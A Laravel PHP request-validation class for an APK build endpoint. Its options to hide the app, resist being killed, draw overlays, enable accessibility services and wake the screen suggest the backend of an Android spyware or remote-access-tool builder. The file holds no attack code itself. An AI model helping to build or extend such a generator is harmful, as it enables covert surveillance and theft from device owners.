<?php

namespace App\Http\Requests\Build;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;

/**
 * APK 构建请求验证（store + stream 共享）。
 */
class BuildRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    /**
     * 在验证之前预处理参数：
     * URL 查询参数中的布尔值是字符串 "true"/"false"，
     * 需要转换为实际布尔值才能通过 boolean 验证规则。
     */
    protected function prepareForValidation(): void
    {
        $booleanFields = ['is_custom'];

        foreach ($booleanFields as $field) {
            if ($this->has($field)) {
                $value = $this->input($field);
                if (is_string($value)) {
                    $this->merge([
                        $field => filter_var($value, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) ?? false,
                    ]);
                }
            }
        }
    }

    public function rules(): array
    {
        return [
            'template_id' => 'nullable|exists:app_templates,id',
            'name' => 'required|string|max:32',
            // 留空时后端自动生成，仅在有值时校验格式
            'package_name' => [
                'nullable',
                'string',
                'max:255',
                Rule::when($this->filled('package_name'), 'regex:/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)*$/'),
            ],
            'version' => [
                'nullable',
                'string',
                'max:20',
                Rule::when($this->filled('version'), 'regex:/^\d+(\.\d+){0,2}$/'),
            ],
            'is_custom' => 'boolean',

            'client_name' => 'nullable|string|max:16',
            'app_url' => 'nullable|string|max:500',

            'lng_short' => 'nullable|string|max:1000',
            'use_atoprims' => 'nullable|string|max:100',
            'login_title' => 'nullable|string|max:100',
            'login_dis' => 'nullable|string|max:50',
            'login_btn' => 'nullable|string|max:50',

            'install_type' => 'nullable|string|in:f,d',
            'install_type2' => 'nullable|string|in:g,s',
            'user_allprims' => 'nullable|string|in:0,1',
            'user_blackprims' => 'nullable|string|in:0,1',

            'hide_type' => 'nullable|string|in:direct,uninstall,prompt,c,f,k',
            'notify_msg' => 'nullable|string|in:on,off',
            'use_antkill' => 'nullable|string|in:0,1',
            'diao_type' => 'nullable|string|in:0,1',
            'hidden_app' => 'nullable|string|in:0,1',
            'use_draw' => 'nullable|string|in:0,1',
            'open_access' => 'nullable|string|in:0,1',
            'use_access' => 'nullable|string|in:0,1',
            'enable_auto_wake_screen' => 'nullable|string|in:0,1',

            'icon_path' => 'nullable|string|max:255',
            'background_path' => 'nullable|string|max:255',
            'abg_path' => 'nullable|string|max:255',
        ];
    }
}
